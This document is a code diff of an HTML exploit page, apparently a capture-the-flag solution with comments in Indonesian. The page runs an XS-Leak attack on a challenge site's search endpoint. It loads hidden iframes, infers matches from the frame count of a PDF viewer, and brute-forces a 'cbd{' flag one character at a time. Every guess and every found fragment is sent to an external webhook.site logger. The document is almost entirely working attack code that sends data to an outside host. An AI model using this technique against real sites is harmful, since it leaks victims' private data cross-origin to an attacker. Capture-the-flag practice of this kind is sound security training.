@@ -1,49 +1,77 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>XS-Leak Exploit</title>
+</head>
 <body>
+    <div id="status">Exploit sedang berjalan... Pantau Webhook kamu.</div>
     <script>
-        const target = "https://wonder.cbd2026.cloud/search?q=";
-        const logger = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
-        // Tambahkan huruf besar untuk berjaga-jaga
-        const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
+        // PENGATURAN - GANTI URL WEBHOOK JIKA BERBEDA
+        const TARGET = "https://wonder.cbd2026.cloud/search?q=";
+        const LOGGER = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
+        
+        // Alfabet lengkap (Huruf kecil, angka, underscore, penutup flag)
+        const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
 
-        async function check(q) {
-            return new Promise(resolve => {
+        async function check(query) {
+            return new Promise((resolve) => {
                 const ifr = document.createElement('iframe');
-                ifr.src = `${target}${encodeURIComponent(q)}&cb=${Math.random()}`;
+                // Tambahkan random cache-buster agar bot tidak mengambil hasil lama
+                ifr.src = `${TARGET}${encodeURIComponent(query)}&cb=${Math.random()}`;
                 ifr.style.display = "none";
                 document.body.appendChild(ifr);
-                
-                // Naikkan ke 2000ms agar PDF sempat loading
+
+                // Tunggu 2 detik agar PDF viewer sempat render
                 setTimeout(() => {
                     try {
+                        // Jika window.length > 0, berarti PDF viewer (frame) terdeteksi
                         const isMatch = ifr.contentWindow.length > 0;
                         document.body.removeChild(ifr);
                         resolve(isMatch);
                     } catch (e) {
-                        resolve(false);
+                        // Jika kena block origin, biasanya itu tanda PDF viewer mencoba load
+                        document.body.removeChild(ifr);
+                        resolve(true); 
                     }
-                }, 2000); 
+                }, 2000);
             });
         }
 
-        async function solve(current) {
-            // Log ke webhook setiap kali mulai menebak karakter baru agar kamu tahu script jalan
-            fetch(`${logger}?checking_from=${current}`);
-            
-            for (let c of alphabet) {
-                let guess = current + c;
+        async function solve(currentFlag) {
+            // Beri tahu webhook kita sedang di posisi mana
+            fetch(`${LOGGER}?searching_at=${currentFlag}`);
+
+            for (let char of ALPHABET) {
+                let guess = currentFlag + char;
+                
+                // Update status di layar bot (opsional)
+                document.getElementById('status').innerText = "Mencoba: " + guess;
+
                 if (await check(guess)) {
-                    fetch(`${logger}?found=${guess}`);
-                    if (c === '}') return;
+                    // JIKA KETEMU: Kirim ke webhook!
+                    fetch(`${LOGGER}?found=${encodeURIComponent(guess)}`);
+                    
+                    // Jika karakter tersebut adalah '}', berarti flag selesai
+                    if (char === '}') {
+                        fetch(`${LOGGER}?msg=FLAG_COMPLETE`);
+                        return;
+                    }
+                    
+                    // Lanjut cari karakter berikutnya
                     return solve(guess);
                 }
             }
-            fetch(`${logger}?msg=FAILED_TO_FIND_NEXT_CHAR_AFTER_${current}`);
+            
+            // Jika semua alfabet dicoba dan tidak ada yang cocok
+            fetch(`${LOGGER}?msg=STOPPED_AT_${currentFlag}_CHECK_ALPHABET`);
         }
 
-        fetch(`${logger}?status=started_v2`);
+        // Mulai serangan
+        // Jika bot mati di tengah jalan, ganti "cbd{" dengan hasil terakhir
+        // Contoh: solve("cbd{pdt_fl4g_");
+        fetch(`${LOGGER}?msg=BOT_STARTING_ATTACK`);
         solve("cbd{");
+
     </script>
 </body>
 </html>
